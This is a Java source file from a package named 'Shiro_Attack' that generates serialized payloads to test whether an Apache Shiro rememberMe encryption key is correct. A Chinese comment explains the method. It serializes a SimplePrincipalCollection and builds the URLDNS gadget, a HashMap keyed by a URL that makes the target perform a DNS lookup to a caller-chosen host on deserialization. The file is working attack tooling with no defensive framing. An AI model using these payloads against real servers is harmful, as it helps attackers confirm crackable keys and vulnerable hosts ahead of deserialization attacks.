package Shiro_Attack;

import org.apache.shiro.subject.SimplePrincipalCollection;

import java.io.*;
import java.net.*;
import java.util.HashMap;
/*
用于检测shiro key 是否正确
1. 利用urldns去检测
2. 利用shiro本身的处理逻辑，key正确or不正确时会抛出异常（因为序列化的类没有继承SilentURLStreamHandler)
，response包中存在remember字段，而当key正确时，继承了SilentURLStreamHandler的类序列化时不抛出异常
response不会有remember字段。
* */
public class KeyDetection {
    public static void Detection(String filename) throws IOException {
        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();

        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(filename));
        obj.writeObject(simplePrincipalCollection);
        obj.close();
    }
    public static void urldns(String filename,String url) throws IOException {

        URLStreamHandler handler = new SilentURLStreamHandler();
        HashMap ht = new HashMap(); // HashMap that will contain the URL
        URL u = new URL(null, url, handler); // URL to use as the Key
        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(filename));
        obj.writeObject(ht);
        obj.close();
    }

    public static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }

}
